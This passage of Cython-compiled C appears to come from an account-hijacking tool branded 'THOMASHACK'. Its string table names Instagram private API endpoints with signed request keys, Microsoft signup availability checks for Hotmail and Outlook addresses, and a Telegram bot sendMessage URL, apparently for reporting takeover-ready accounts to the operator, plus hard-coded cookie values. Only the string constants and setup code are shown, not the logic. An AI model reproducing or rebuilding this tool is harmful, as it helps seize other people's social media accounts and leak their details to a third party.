  {&__pyx_n_u_fb_api_req_friendly_name, __pyx_k_fb_api_req_friendly_name, sizeof(__pyx_k_fb_api_req_friendly_name), 0, 1, 0, 1},
  {&__pyx_n_s_filename, __pyx_k_filename, sizeof(__pyx_k_filename), 0, 0, 1, 1},
  {&__pyx_n_s_fj, __pyx_k_fj, sizeof(__pyx_k_fj), 0, 0, 1, 1},
  {&__pyx_n_s_fol, __pyx_k_fol, sizeof(__pyx_k_fol), 0, 0, 1, 1},
  {&__pyx_n_s_fols, __pyx_k_fols, sizeof(__pyx_k_fols), 0, 0, 1, 1},
  {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
  {&__pyx_n_u_full_name, __pyx_k_full_name, sizeof(__pyx_k_full_name), 0, 1, 0, 1},
  {&__pyx_n_s_generate_user_agent, __pyx_k_generate_user_agent, sizeof(__pyx_k_generate_user_agent), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_n_s_get_id, __pyx_k_get_id, sizeof(__pyx_k_get_id), 0, 0, 1, 1},
  {&__pyx_n_s_get_username, __pyx_k_get_username, sizeof(__pyx_k_get_username), 0, 0, 1, 1},
  {&__pyx_n_s_getcnre, __pyx_k_getcnre, sizeof(__pyx_k_getcnre), 0, 0, 1, 1},
  {&__pyx_n_s_gm1, __pyx_k_gm1, sizeof(__pyx_k_gm1), 0, 0, 1, 1},
  {&__pyx_n_s_gm2, __pyx_k_gm2, sizeof(__pyx_k_gm2), 0, 0, 1, 1},
  {&__pyx_n_s_goodhotandout, __pyx_k_goodhotandout, sizeof(__pyx_k_goodhotandout), 0, 0, 1, 1},
  {&__pyx_kp_u_green_yellow, __pyx_k_green_yellow, sizeof(__pyx_k_green_yellow), 0, 1, 0, 0},
  {&__pyx_n_s_grn, __pyx_k_grn, sizeof(__pyx_k_grn), 0, 0, 1, 1},
  {&__pyx_kp_u_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 1, 0, 0},
  {&__pyx_kp_u_gzip_deflate_br, __pyx_k_gzip_deflate_br, sizeof(__pyx_k_gzip_deflate_br), 0, 1, 0, 0},
  {&__pyx_n_s_haha, __pyx_k_haha, sizeof(__pyx_k_haha), 0, 0, 1, 1},
  {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_heedrs, __pyx_k_heedrs, sizeof(__pyx_k_heedrs), 0, 0, 1, 1},
  {&__pyx_n_s_hexdigest, __pyx_k_hexdigest, sizeof(__pyx_k_hexdigest), 0, 0, 1, 1},
  {&__pyx_kp_u_hmac_AR11z00N_IbRNGrzU_J3F40kHM4, __pyx_k_hmac_AR11z00N_IbRNGrzU_J3F40kHM4, sizeof(__pyx_k_hmac_AR11z00N_IbRNGrzU_J3F40kHM4), 0, 1, 0, 0},
  {&__pyx_kp_u_hmac_AR2f295htsHXPFyt6RxGipeoIQH, __pyx_k_hmac_AR2f295htsHXPFyt6RxGipeoIQH, sizeof(__pyx_k_hmac_AR2f295htsHXPFyt6RxGipeoIQH), 0, 1, 0, 0},
  {&__pyx_kp_u_hotmail_com, __pyx_k_hotmail_com, sizeof(__pyx_k_hotmail_com), 0, 1, 0, 0},
  {&__pyx_n_u_hpgid, __pyx_k_hpgid, sizeof(__pyx_k_hpgid), 0, 1, 0, 1},
  {&__pyx_kp_u_https_api_telegram_org_bot, __pyx_k_https_api_telegram_org_bot, sizeof(__pyx_k_https_api_telegram_org_bot), 0, 1, 0, 0},
  {&__pyx_kp_u_https_api_telegram_org_bot696846, __pyx_k_https_api_telegram_org_bot696846, sizeof(__pyx_k_https_api_telegram_org_bot696846), 0, 1, 0, 0},
  {&__pyx_kp_u_https_i_instagram_com_api_v1_acc, __pyx_k_https_i_instagram_com_api_v1_acc, sizeof(__pyx_k_https_i_instagram_com_api_v1_acc), 0, 1, 0, 0},
  {&__pyx_kp_u_https_o7aa_pythonanywhere_com_id, __pyx_k_https_o7aa_pythonanywhere_com_id, sizeof(__pyx_k_https_o7aa_pythonanywhere_com_id), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com, __pyx_k_https_signup_live_com, sizeof(__pyx_k_https_signup_live_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_API_CheckA, __pyx_k_https_signup_live_com_API_CheckA, sizeof(__pyx_k_https_signup_live_com_API_CheckA), 0, 1, 0, 0},
  {&__pyx_kp_u_https_signup_live_com_signup_mkt, __pyx_k_https_signup_live_com_signup_mkt, sizeof(__pyx_k_https_signup_live_com_signup_mkt), 0, 1, 0, 0},
  {&__pyx_kp_u_https_t_me_thomashack, __pyx_k_https_t_me_thomashack, sizeof(__pyx_k_https_t_me_thomashack), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com, __pyx_k_https_www_instagram_com, sizeof(__pyx_k_https_www_instagram_com), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_5u2_a, __pyx_k_https_www_instagram_com_5u2_a, sizeof(__pyx_k_https_www_instagram_com_5u2_a), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_v1_u, __pyx_k_https_www_instagram_com_api_v1_u, sizeof(__pyx_k_https_www_instagram_com_api_v1_u), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_api_v1_w, __pyx_k_https_www_instagram_com_api_v1_w, sizeof(__pyx_k_https_www_instagram_com_api_v1_w), 0, 1, 0, 0},
  {&__pyx_kp_u_https_www_instagram_com_graphql, __pyx_k_https_www_instagram_com_graphql, sizeof(__pyx_k_https_www_instagram_com_graphql), 0, 1, 0, 0},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_kp_u_i_instagram_com, __pyx_k_i_instagram_com, sizeof(__pyx_k_i_instagram_com), 0, 1, 0, 0},
  {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
  {&__pyx_n_u_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 1, 0, 1},
  {&__pyx_n_s_ids, __pyx_k_ids, sizeof(__pyx_k_ids), 0, 0, 1, 1},
  {&__pyx_n_s_idtle, __pyx_k_idtle, sizeof(__pyx_k_idtle), 0, 0, 1, 1},
  {&__pyx_n_u_ig_sig_key_version, __pyx_k_ig_sig_key_version, sizeof(__pyx_k_ig_sig_key_version), 0, 1, 0, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_u_includeSuggestions, __pyx_k_includeSuggestions, sizeof(__pyx_k_includeSuggestions), 0, 1, 0, 1},
  {&__pyx_n_s_infoprint, __pyx_k_infoprint, sizeof(__pyx_k_infoprint), 0, 0, 1, 1},
  {&__pyx_n_s_infosand, __pyx_k_infosand, sizeof(__pyx_k_infosand), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_ins1, __pyx_k_ins1, sizeof(__pyx_k_ins1), 0, 0, 1, 1},
  {&__pyx_n_s_ins2, __pyx_k_ins2, sizeof(__pyx_k_ins2), 0, 0, 1, 1},
  {&__pyx_kp_u_ip, __pyx_k_ip, sizeof(__pyx_k_ip), 0, 1, 0, 0},
  {&__pyx_kp_u_isAvailable_true, __pyx_k_isAvailable_true, sizeof(__pyx_k_isAvailable_true), 0, 1, 0, 0},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_kp_u_keep_alive, __pyx_k_keep_alive, sizeof(__pyx_k_keep_alive), 0, 1, 0, 0},
  {&__pyx_n_u_lic, __pyx_k_lic, sizeof(__pyx_k_lic), 0, 1, 0, 1},
  {&__pyx_n_s_lines, __pyx_k_lines, sizeof(__pyx_k_lines), 0, 0, 1, 1},
  {&__pyx_n_s_loob, __pyx_k_loob, sizeof(__pyx_k_loob), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
  {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},
  {&__pyx_n_s_md5, __pyx_k_md5, sizeof(__pyx_k_md5), 0, 0, 1, 1},
  {&__pyx_n_s_mechanize, __pyx_k_mechanize, sizeof(__pyx_k_mechanize), 0, 0, 1, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_kp_u_mid_ZHTlnQALAAFHZAE8G64BeLHXNMv6, __pyx_k_mid_ZHTlnQALAAFHZAE8G64BeLHXNMv6, sizeof(__pyx_k_mid_ZHTlnQALAAFHZAE8G64BeLHXNMv6), 0, 1, 0, 0},
  {&__pyx_kp_u_mid_Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ, __pyx_k_mid_Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ, sizeof(__pyx_k_mid_Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ), 0, 1, 0, 0},
  {&__pyx_n_u_mkt, __pyx_k_mkt, sizeof(__pyx_k_mkt), 0, 1, 0, 1},
  {&__pyx_n_u_mkt1, __pyx_k_mkt1, sizeof(__pyx_k_mkt1), 0, 1, 0, 1},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_nambrline, __pyx_k_nambrline, sizeof(__pyx_k_nambrline), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_n_s_namefile, __pyx_k_namefile, sizeof(__pyx_k_namefile), 0, 0, 1, 1},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_n_u_nt, __pyx_k_nt, sizeof(__pyx_k_nt), 0, 1, 0, 1},
  {&__pyx_n_s_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 0, 1, 1},
  {&__pyx_n_s_okhot, __pyx_k_okhot, sizeof(__pyx_k_okhot), 0, 0, 1, 1},
  {&__pyx_n_s_okout, __pyx_k_okout, sizeof(__pyx_k_okout), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_orde, __pyx_k_orde, sizeof(__pyx_k_orde), 0, 0, 1, 1},
  {&__pyx_n_u_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 1, 0, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_kp_u_outlook_com, __pyx_k_outlook_com, sizeof(__pyx_k_outlook_com), 0, 1, 0, 0},
  {&__pyx_n_s_output, __pyx_k_output, sizeof(__pyx_k_output), 0, 0, 1, 1},
  {&__pyx_n_s_p, __pyx_k_p, sizeof(__pyx_k_p), 0, 0, 1, 1},
  {&__pyx_n_s_params, __pyx_k_params, sizeof(__pyx_k_params), 0, 0, 1, 1},
  {&__pyx_kp_u_pip_install_AegosPy, __pyx_k_pip_install_AegosPy, sizeof(__pyx_k_pip_install_AegosPy), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_Faker, __pyx_k_pip_install_Faker, sizeof(__pyx_k_pip_install_Faker), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_GetInfoInsta, __pyx_k_pip_install_GetInfoInsta, sizeof(__pyx_k_pip_install_GetInfoInsta), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_colorama, __pyx_k_pip_install_colorama, sizeof(__pyx_k_pip_install_colorama), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_faker, __pyx_k_pip_install_faker, sizeof(__pyx_k_pip_install_faker), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_json, __pyx_k_pip_install_json, sizeof(__pyx_k_pip_install_json), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_mechanize, __pyx_k_pip_install_mechanize, sizeof(__pyx_k_pip_install_mechanize), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_prettytable, __pyx_k_pip_install_prettytable, sizeof(__pyx_k_pip_install_prettytable), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_python_cfonts, __pyx_k_pip_install_python_cfonts, sizeof(__pyx_k_pip_install_python_cfonts), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_requests, __pyx_k_pip_install_requests, sizeof(__pyx_k_pip_install_requests), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_threading, __pyx_k_pip_install_threading, sizeof(__pyx_k_pip_install_threading), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_user_agent, __pyx_k_pip_install_user_agent, sizeof(__pyx_k_pip_install_user_agent), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_uuid, __pyx_k_pip_install_uuid, sizeof(__pyx_k_pip_install_uuid), 0, 1, 0, 0},
  {&__pyx_kp_u_pip_install_webbrowser, __pyx_k_pip_install_webbrowser, sizeof(__pyx_k_pip_install_webbrowser), 0, 1, 0, 0},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_prettytable, __pyx_k_prettytable, sizeof(__pyx_k_prettytable), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_kp_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 0},
  {&__pyx_n_s_r_2, __pyx_k_r_2, sizeof(__pyx_k_r_2), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_readlines, __pyx_k_readlines, sizeof(__pyx_k_readlines), 0, 0, 1, 1},
  {&__pyx_n_s_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 0, 1, 1},
  {&__pyx_n_u_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 1, 0, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_render, __pyx_k_render, sizeof(__pyx_k_render), 0, 0, 1, 1},
  {&__pyx_n_s_req, __pyx_k_req, sizeof(__pyx_k_req), 0, 0, 1, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_rest, __pyx_k_rest, sizeof(__pyx_k_rest), 0, 0, 1, 1},
  {&__pyx_n_s_rich, __pyx_k_rich, sizeof(__pyx_k_rich), 0, 0, 1, 1},
  {&__pyx_n_s_rich_console, __pyx_k_rich_console, sizeof(__pyx_k_rich_console), 0, 0, 1, 1},
  {&__pyx_n_s_rich_panel, __pyx_k_rich_panel, sizeof(__pyx_k_rich_panel), 0, 0, 1, 1},
  {&__pyx_n_s_rich_text, __pyx_k_rich_text, sizeof(__pyx_k_rich_text), 0, 0, 1, 1},
  {&__pyx_n_s_rr, __pyx_k_rr, sizeof(__pyx_k_rr), 0, 0, 1, 1},
  {&__pyx_n_s_rule, __pyx_k_rule, sizeof(__pyx_k_rule), 0, 0, 1, 1},
  {&__pyx_n_s_s, __pyx_k_s, sizeof(__pyx_k_s), 0, 0, 1, 1},
  {&__pyx_kp_u_same_origin, __pyx_k_same_origin, sizeof(__pyx_k_same_origin), 0, 1, 0, 0},
  {&__pyx_n_u_scid, __pyx_k_scid, sizeof(__pyx_k_scid), 0, 1, 0, 1},
  {&__pyx_kp_u_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 1, 0, 0},
  {&__pyx_kp_u_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 1, 0, 0},
  {&__pyx_n_s_secim, __pyx_k_secim, sizeof(__pyx_k_secim), 0, 0, 1, 1},
  {&__pyx_n_s_secrets, __pyx_k_secrets, sizeof(__pyx_k_secrets), 0, 0, 1, 1},
  {&__pyx_n_s_self, __pyx_k_self, sizeof(__pyx_k_self), 0, 0, 1, 1},
  {&__pyx_kp_u_sendMessage_chat_id, __pyx_k_sendMessage_chat_id, sizeof(__pyx_k_sendMessage_chat_id), 0, 1, 0, 0},
  {&__pyx_n_u_server_timestamps, __pyx_k_server_timestamps, sizeof(__pyx_k_server_timestamps), 0, 1, 0, 1},
  {&__pyx_n_s_sg, __pyx_k_sg, sizeof(__pyx_k_sg), 0, 0, 1, 1},
  {&__pyx_n_u_signInName, __pyx_k_signInName, sizeof(__pyx_k_signInName), 0, 1, 0, 1},
  {&__pyx_n_u_signed_body, __pyx_k_signed_body, sizeof(__pyx_k_signed_body), 0, 1, 0, 1},
  {&__pyx_kp_u_signup_live_com, __pyx_k_signup_live_com, sizeof(__pyx_k_signup_live_com), 0, 1, 0, 0},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_u_spin_b, __pyx_k_spin_b, sizeof(__pyx_k_spin_b), 0, 1, 0, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_kp_u_status, __pyx_k_status, sizeof(__pyx_k_status), 0, 1, 0, 0},
  {&__pyx_n_s_strip, __pyx_k_strip, sizeof(__pyx_k_strip), 0, 0, 1, 1},
  {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_t, __pyx_k_t, sizeof(__pyx_k_t), 0, 0, 1, 1},
  {&__pyx_n_s_target, __pyx_k_target, sizeof(__pyx_k_target), 0, 0, 1, 1},
  {&__pyx_n_u_tcxt, __pyx_k_tcxt, sizeof(__pyx_k_tcxt), 0, 1, 0, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_u_text_2, __pyx_k_text_2, sizeof(__pyx_k_text_2), 0, 1, 0, 0},
  {&__pyx_kp_u_thomas_txt, __pyx_k_thomas_txt, sizeof(__pyx_k_thomas_txt), 0, 1, 0, 0},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_s_token_hex, __pyx_k_token_hex, sizeof(__pyx_k_token_hex), 0, 0, 1, 1},
  {&__pyx_n_s_tokenbot, __pyx_k_tokenbot, sizeof(__pyx_k_tokenbot), 0, 0, 1, 1},
  {&__pyx_n_u_true, __pyx_k_true, sizeof(__pyx_k_true), 0, 1, 0, 1},
  {&__pyx_n_u_trunk, __pyx_k_trunk, sizeof(__pyx_k_trunk), 0, 1, 0, 1},
  {&__pyx_n_s_u, __pyx_k_u, sizeof(__pyx_k_u), 0, 0, 1, 1},
  {&__pyx_n_u_uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ, __pyx_k_uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ, sizeof(__pyx_k_uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ), 0, 1, 0, 1},
  {&__pyx_n_u_uaid, __pyx_k_uaid, sizeof(__pyx_k_uaid), 0, 1, 0, 1},
  {&__pyx_n_u_uiflvr, __pyx_k_uiflvr, sizeof(__pyx_k_uiflvr), 0, 1, 0, 1},
  {&__pyx_kp_u_unicode_escape, __pyx_k_unicode_escape, sizeof(__pyx_k_unicode_escape), 0, 1, 0, 0},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_s_use, __pyx_k_use, sizeof(__pyx_k_use), 0, 0, 1, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_n_u_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 1, 0, 1},
  {&__pyx_kp_u_userID, __pyx_k_userID, sizeof(__pyx_k_userID), 0, 1, 0, 0},
  {&__pyx_kp_u_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 1, 0, 0},
  {&__pyx_n_s_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 0, 1, 1},
  {&__pyx_n_s_user_file, __pyx_k_user_file, sizeof(__pyx_k_user_file), 0, 0, 1, 1},
  {&__pyx_n_s_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 0, 1, 1},
  {&__pyx_n_u_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 1, 0, 1},
  {&__pyx_kp_u_username_0s9s, __pyx_k_username_0s9s, sizeof(__pyx_k_username_0s9s), 0, 1, 0, 0},
  {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
  {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
  {&__pyx_n_u_variables, __pyx_k_variables, sizeof(__pyx_k_variables), 0, 1, 0, 1},
  {&__pyx_n_s_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 0, 1, 1},
  {&__pyx_n_s_webbrowser, __pyx_k_webbrowser, sizeof(__pyx_k_webbrowser), 0, 0, 1, 1},
  {&__pyx_n_u_white, __pyx_k_white, sizeof(__pyx_k_white), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_kp_u_www_instagram_com, __pyx_k_www_instagram_com, sizeof(__pyx_k_www_instagram_com), 0, 1, 0, 0},
  {&__pyx_n_s_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 0, 1, 1},
  {&__pyx_kp_u_x_csrftoken, __pyx_k_x_csrftoken, sizeof(__pyx_k_x_csrftoken), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ms_apitransport, __pyx_k_x_ms_apitransport, sizeof(__pyx_k_x_ms_apitransport), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ms_apiversion, __pyx_k_x_ms_apiversion, sizeof(__pyx_k_x_ms_apiversion), 0, 1, 0, 0},
  {&__pyx_n_u_xhr, __pyx_k_xhr, sizeof(__pyx_k_xhr), 0, 1, 0, 1},
  {&__pyx_n_s_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 0, 1, 1},
  {&__pyx_n_s_yalo, __pyx_k_yalo, sizeof(__pyx_k_yalo), 0, 0, 1, 1},
  {&__pyx_kp_u_yellow_green_T5OMAS_THOMASHACK, __pyx_k_yellow_green_T5OMAS_THOMASHACK, sizeof(__pyx_k_yellow_green_T5OMAS_THOMASHACK), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow, __pyx_k_yellow_green_green_yellow, sizeof(__pyx_k_yellow_green_green_yellow), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow_2, __pyx_k_yellow_green_green_yellow_2, sizeof(__pyx_k_yellow_green_green_yellow_2), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow_3, __pyx_k_yellow_green_green_yellow_3, sizeof(__pyx_k_yellow_green_green_yellow_3), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow_4, __pyx_k_yellow_green_green_yellow_4, sizeof(__pyx_k_yellow_green_green_yellow_4), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow_5, __pyx_k_yellow_green_green_yellow_5, sizeof(__pyx_k_yellow_green_green_yellow_5), 0, 1, 0, 0},
  {&__pyx_kp_u_yellow_green_green_yellow_6, __pyx_k_yellow_green_green_yellow_6, sizeof(__pyx_k_yellow_green_green_yellow_6), 0, 1, 0, 0},
  {&__pyx_n_s_z, __pyx_k_z, sizeof(__pyx_k_z), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 70, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 105, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 406, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 408, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 674, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 769, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_tuple__2 = PyTuple_Pack(1, __pyx_kp_u_Dosya_Bulunamad); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 413, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  
  __pyx_tuple__11 = PyTuple_Pack(1, __pyx_kp_u_https_signup_live_com_API_CheckA); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_u_https_signup_live_com); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  
  __pyx_tuple__28 = PyTuple_Pack(1, __pyx_kp_u_Dosya_Silindi); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 695, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);

  
  __pyx_tuple__29 = PyTuple_Pack(1, __pyx_kp_u_Dosya_Bulunamad_2); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 697, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);

  
  __pyx_tuple__30 = PyTuple_Pack(2, __pyx_int_1000000, __pyx_int_40975110); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 705, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
